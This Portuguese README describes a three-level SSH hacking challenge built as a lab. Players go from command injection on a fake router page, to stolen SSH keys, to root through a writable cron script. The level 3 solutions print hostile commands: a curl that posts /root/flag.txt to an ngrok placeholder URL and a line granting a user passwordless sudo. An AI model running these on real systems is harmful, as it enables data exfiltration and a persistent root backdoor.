# ssh-game
Repositorio com objetivo de armazenar desafio de hacking relacionado a SSH

## nivel 1
Neste nível, o objetivo é que as pessoas possam navegar em uma interface que se pareça com um roteador.
Até encontrarem uma ferramenta de ping, que utiliza  command line para executar o teste.
Através disto, serão desafiadas a encontrar as chaves de conexão SSH do roteador, seguindo para o desafio nivel 2.
Terá uma flag no arquivo id_rsa, o mais importante para este momento.

## nivel 2
Este nível, é quase uma extensão, em termos de dificuldade, do nível 1.
A pessoa que obtiver as chaves, deverá trazê-las para sua máquina, modificar o nível de permissionamento deste (caso exista, se tratando de windows, isso não faz a menor diferença) e, depois, utilizar para conectar-se via SSH ao pseudo-roteador.
Após os passos descritos acima, é necessário montar o ambiente necessário para conexão via SSH, se for Windows, basta utilizar o Putty, se Linux, já existirá o ssh client nativo.
Ao obter a conexão, será exibido um BANNER de login (WIP), com algumas instruções e a próxima flag.

## nivel 3
Este nível, é o mais difícil e aqui está como finalização, após este o comprometimento da máquina se dá por completo.
A pessoa que estiver jogando, será convidada a ler o conteúdo do arquivo /root/flag.txt.
Para isso, será necessário realizar um privilege escalation através de uma tarefa cron.
Com isso, será demonstrado que, é possível ler uma tabela cron e saber se existem scripts desprotegidos e sendo executados como root.
Uma das possíveis soluções é, criar um arquivo `log.sh`, na home do temp_user para que faça um :
- cat /root/flag/txt > /home/temp_user/flag.txt && chmod 777 /home/temp_user/flag.txt 
- curl -X POST --data-binary @/root/flag.txt [URL_DO_NGROK] 
- echo "temp_user ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
Qualquer uma destas soluções habilita a leitura do arquivo /root/flag.txt
O arquivo log.sh pode ser descoberto através de um cat em /etc/crontab


## O que preciso instalar?
  * Docker
    Estes desafios estão FORTEMENTE acoplados a Docker e Docker Compose.
    O desafio 2 considera que existe Docker localmente para que possa iniciar sessões com experiência de SSH mas conectando-se ao tty e stdin dos containers executados.
  * Nodejs 12.x
  * SSH client
  * AZ Cli
  * Terraform (caso queira publicar a infra no Azure via AzureRM)

## Já instalei docker e docker-compose, o que faço agora?
Depois de ter instalado o que era necessário, basta rodar:
```bash
docker-compose build
docker-compose up
```

No caso de estar em ambiente Windows, o sock do docker é diferente, utilize:
```powershell
docker-compose -f docker-compose.windows.yml build
docker-compose -f docker-compose.windows.yml up
```

Os desafios estarão dispoíveis conforme descrito abaixo:
* nivel 1 - [http://localhost:4444](http://localhost:4444)
* nivel 2 - tcp://localhost:2222
* nivel 3 - usa a mesma conexão do nível 2

## Publicando no Azure
Após instalar `AZ Cli` e `terraform` de acordo com as recomendações para o seu sistema operacional, é necessário iniciar algumas etapas:
1. `az login` (para logar em sua conta, basta seguir o passo a passo ao abrir o navegador)
2. `az account show` (para verificar se está utilizando a subscription correta, para trocar veja este [link](https://docs.microsoft.com/en-us/cli/azure/account?view=azure-cli-latest#az_account_set))
3. Na pasta do terraform, `terraform init` (para baixar o provider do Azure, azurerm)
4. `terraform apply` (para que o terraform conecte no azure e crie o plano de provisionamento)
5. Se estiver de acordo com o plano e a subscription usada, responda com `yes` ao prompt do `terraform`
6. Infelizmente, não consegui entender a forma de pegar o Public IP via `output`, para isso, conecte no portal azure e, dentro do resource da VM, veja a propriedade `Public IP address`
7. Ainda não pensei na forma de publicar o jogo todo lá dentro, apenas provisionar recursos ... isto é WIP

## Informações complementares
Para rodar estes desafios, será necessário ter ngrok instalado e, após isto, remapear, no `docker-compose.yml`, portas de nível root (80 e 22).
Portas altas foram usadas para não ser necessário qualquer privilégio administrativo enquanto desenvolvimento.
A experiência completa se baseia em parecer com um roteador de verdade, portanto, é necessário utilizar portas que sejam também usadas por tal.
